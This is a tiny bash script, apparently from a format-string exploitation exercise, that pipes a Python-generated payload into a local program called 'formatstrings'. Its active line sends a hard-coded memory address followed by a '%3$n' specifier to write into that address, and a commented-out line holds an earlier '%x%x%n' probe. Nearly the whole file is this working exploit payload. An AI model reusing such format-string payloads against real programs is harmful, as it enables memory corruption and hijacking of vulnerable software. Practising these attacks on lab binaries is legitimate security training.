#/usr/bin/bash

# generate our string and test!
#python -c "print '%x%x%n\r'"|./formatstrings 2
python -c "print '\x0c\xb0\x04\x08%3\$n'"|./formatstrings 2
